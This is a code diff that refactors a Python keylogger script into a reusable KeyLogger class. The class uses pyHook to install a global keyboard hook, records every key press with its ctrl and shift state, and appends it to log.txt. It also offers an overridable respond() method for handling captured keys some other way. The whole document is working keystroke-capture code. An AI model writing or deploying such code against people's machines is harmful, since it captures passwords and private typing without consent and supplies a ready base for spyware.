@@ -1,53 +1,79 @@
 from pyHook import HookManager, GetKeyState, HookConstants
 from pythoncom import PumpMessages
 from sys import stdout
-from logging import basicConfig, log, DEBUG
+from logging import getLogger, FileHandler, Formatter, DEBUG
 import string
 
-log_file = "log.txt"
-basicConfig(filename="log.txt", level=DEBUG, format="%(message)s")
+import pdb
 
+# TODO supress RuntimeWarning. figure out alt error.
 
-def ctrl_down():
-    """ Determine if either control key is pressed
+class KeyLogger(object):
 
-    """
-    return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))
+    def __init__(self, logging=True):
+        if logging:
+            log_file = "log.txt"
+            self.logger = getLogger("keys")
+            handler = FileHandler(log_file)
+            formatter = Formatter("%(message)s")
+            handler.setFormatter(formatter)
+            self.logger.addHandler(handler)
+            self.logger.setLevel(DEBUG)
 
-def shift_down():
-    """ Determine if either shift key is pressed
+    def ctrl_down(self):
+        """ Determine if either control key is pressed
 
-    """
-    return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))
+        """
+        return GetKeyState(HookConstants.VKeyToID("VK_CONTROL"))
 
-def keylog(event):
-    """ Properly record key presses
+    def shift_down(self):
+        """ Determine if either shift key is pressed
 
-    """
-    key=event.GetKey()
-    ctrl = ctrl_down()
-    shift = shift_down()
-    if ctrl and shift:
-        final_key = "ctrl+shift+"+key
-    elif ctrl:
-        if key in string.ascii_uppercase:
-            final_key = "ctrl+"+key.lower()
+        """
+        return GetKeyState(HookConstants.VKeyToID("VK_SHIFT"))
+
+    def key_log(self, event):
+        """ Properly record key presses
+
+        """
+        key=event.GetKey()
+        ctrl = self.ctrl_down()
+        shift = self.shift_down()
+        if ctrl and shift:
+            final_key = "ctrl+shift+"+key
+        elif ctrl:
+            if key in string.ascii_uppercase:
+                final_key = "ctrl+"+key.lower()
+            else:
+                final_key = "ctrl+"+key
+        elif shift:
+            final_key = "shift+"+key
         else:
-            final_key = "ctrl+"+key
-    elif shift:
-        final_key = "shift+"+key
-    else:
-        if key in string.ascii_uppercase:
-            final_key = key.lower()
-        else:
-            final_key = key
-    log(10, final_key)
+            if key in string.ascii_uppercase:
+                final_key = key.lower()
+            else:
+                final_key = key
+        self.respond(final_key)
+
+    def respond(self, key):
+        """ Override this function to change key response functionality.
+
+        Default functionality logs keys to file.
+        """
+        self.logger.info(str(key))
+
+    def start_capture(self):
+        """ Hook keyboard and pull key presses
+
+        keyboardhooking courtesy of
+        http://www.tinkernut.com/2013/07/17/how-to-make-a-simple-python-keylogger
+        """
+        hook = HookManager()
+        hook.KeyDown = self.key_log
+        hook.HookKeyboard()
+        PumpMessages()
 
 
-# keyboardhooking courtesy of
-# http://www.tinkernut.com/2013/07/17/how-to-make-a-simple-python-keylogger
-hook = HookManager()
-hook.KeyDown = keylog
-hook.HookKeyboard()
-PumpMessages()
-
+if __name__ == "__main__":
+    kl = KeyLogger()
+    kl.start_capture()
